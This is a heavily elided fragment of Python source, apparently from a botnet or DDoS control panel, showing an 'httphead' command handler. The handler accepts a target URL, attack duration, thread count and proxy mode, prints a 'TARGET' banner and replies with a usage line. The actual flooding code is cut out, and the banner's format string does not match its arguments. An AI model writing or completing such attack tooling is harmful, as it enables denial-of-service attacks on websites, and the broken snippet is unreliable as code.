...
def httphead(args, validate_time, send, client, ansi_clear, broadcast, data):
    ...
    if len(args) == 5:
        ...
        xxxx = '''%s============= (%sTARGET%s) ==============
            ...
            %sTYPE:%s %s
         %sTHREADS:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, attackType, Fore.CYAN, Fore.LIGHTWHITE_EX, threadx, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP HEAD')
        ...
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httphead [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')